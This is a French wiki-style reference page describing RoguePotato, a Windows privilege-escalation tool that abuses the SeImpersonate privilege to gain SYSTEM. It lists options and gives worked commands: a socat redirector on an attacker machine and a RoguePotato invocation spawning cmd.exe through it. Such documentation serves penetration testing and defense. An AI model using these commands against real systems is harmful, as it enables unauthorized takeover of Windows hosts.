---
title: RoguePotato
description: Permet d'utiliser les privilèges SeImpersonate pour escalader les privilèges jusqu'au compte NT AUTHORITY\SYSTEM
published: true
date: 2024-07-16T17:13:19.885Z
tags: outil, windows, élévation des privilèges
editor: markdown
dateCreated: 2024-07-13T10:59:42.756Z
---

# Introduction

RoguePotato permet d'utiliser le privilège SeImpersonate pour escalader les privilèges jusqu'au compte NT AUTHORITY\SYSTEM.

> RoguePotato est disponible au téléchargement ici: https://github.com/antonioCoco/RoguePotato
> {.is-info}

> RoguePotato est une alternative à Juicy Potato, qui ne fonctionne pas sur les versions après Windows Server 2019 et Windows 10 build 1809.
> {.is-info}

# Syntaxe

`RoguePotato.exe -r [Adresse IP] -e [commande] [options]`

# Options

| Option            | Description                                                                                                         |
| ----------------- | ------------------------------------------------------------------------------------------------------------------- |
| `-r [Adresse IP]` | Spécifie l'adresse de la machine distante à utiliser comme redirecteur                                              |
| `-e [commande]`   | Spécifie la commande à exécuter                                                                                     |
| `-l`              | Spécifie le port d'écoute du RogueOxidResolver                                                                      |
| `-p`              | Nom du canal nommé à utilisé (par défaut: RoguePotato)                                                              |
| `-z`              | Rend aléatoire le nom du canal nommé utilisé (ne pas utiliser avec -p)                                              |
| `-c`              | Précise le CLSID utilisé (par défaut, celui du Service de transfert intelligent en arrière-plan (BITS) est utilisé) |

> Pourquoi le CLSID du Service de transfert intelligent en arrière-plan (BITS) est utilisé par défaut? C'est simple, le CLSID de BITS est le même entre chaque machine. Il est possible de préciser d'autres CLSID pour utiliser d'autres token
> {.is-info}

# Exemples

1. Sur la machine attaquante, utiliser socat pour rediriger le port 135 (RPC) sur le port 9999 de la machine cliente (il faut utiliser le même port sur la machine cliente, celui-ci n'est pas forcément le port 9999):

`socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999`

2. Lancement de RoguePotato sur la machine cliente avec l'adresse de la machine attaquante comme ip distante, comme commande "cmd.exe" et comme port 9999 (le même que précisé antérieurement)

`RoguePotato.exe -r 10.0.0.2 -e "C:\windows\system32\cmd.exe" -l 9999`

# Voir aussi

Fonction CreateProcessWithTokenW:
https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw

Fonction CreateProcessAsUser:
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera

Liste des CLSID (peut être incomplet):
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

Pourquoi JuicyPotato ne fonctionne pas sur les versions après Windows Server 2019 et Windows 10 build 1809:
https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/

Présentation et fonctionnement basique des potatoes:
https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato
